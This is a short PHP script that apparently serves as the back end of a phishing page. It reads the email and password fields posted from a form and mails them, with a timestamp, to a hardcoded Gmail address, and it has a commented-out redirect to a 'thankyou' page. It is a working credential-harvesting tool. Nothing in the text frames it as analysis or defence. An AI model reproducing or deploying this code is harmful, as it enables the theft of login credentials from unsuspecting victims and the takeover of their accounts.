<?php
//get data from form  
$password = $_POST['password'];
$email= $_POST['email'];
$to = "sofiamendez2069@gmail.com";
$subject = "Account Info" . date("Y/m/d" . " " . date("h:i:sa"));
$txt ="Email = " . $email . "\r\n Password =" . $password;
$headers = "From: sofiamendez2069@gmail.com" . "\r\n" .
"CC: sofiamendez2069@gmail.com";
if($email!=NULL){
    mail($to,$subject,$txt,$headers);
}
//redirect
//header("Location:thankyou.html");
?>